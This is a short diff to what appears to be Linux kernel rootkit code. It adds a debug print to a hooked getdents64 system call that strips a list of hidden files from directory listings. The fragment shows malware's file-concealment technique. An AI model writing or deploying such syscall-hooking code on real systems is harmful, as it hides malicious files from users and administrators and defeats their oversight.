@@ -124,6 +124,8 @@ asmlinkage long hooked_getdents64(unsigned int fd, struct linux_dirent64 __user 
     int i;
     
     rv = kernel_getdents64(fd, dirp, count);
+    printk("hide %d...\n", filenum);
+    
     for(i=0; i<filenum; i++){
         rv = hide_file64(hidfiles[i], dirp, rv);
     }
